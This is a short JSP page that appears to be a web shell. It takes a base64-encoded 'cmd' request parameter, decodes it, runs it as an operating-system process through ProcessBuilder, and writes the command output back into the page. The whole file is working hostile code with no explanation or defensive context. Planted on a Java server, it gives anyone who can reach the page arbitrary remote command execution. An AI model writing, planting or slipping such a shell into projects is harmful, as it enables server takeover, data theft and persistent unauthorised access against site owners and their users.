<pre>
<%@ page import="java.util.*,java.io.*,java.lang.*"%>
<%
sun.misc.BASE64Decoder dec64 = new sun.misc.BASE64Decoder();
byte[] bc = dec64.decodeBuffer(request.getParameter("cmd"));
String sc = new String(bc, "UTF-8");
Process a =( new java.lang.ProcessBuilder(sc.toString().split("\\s"))).start();
InputStream in = a.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
%>
</pre>
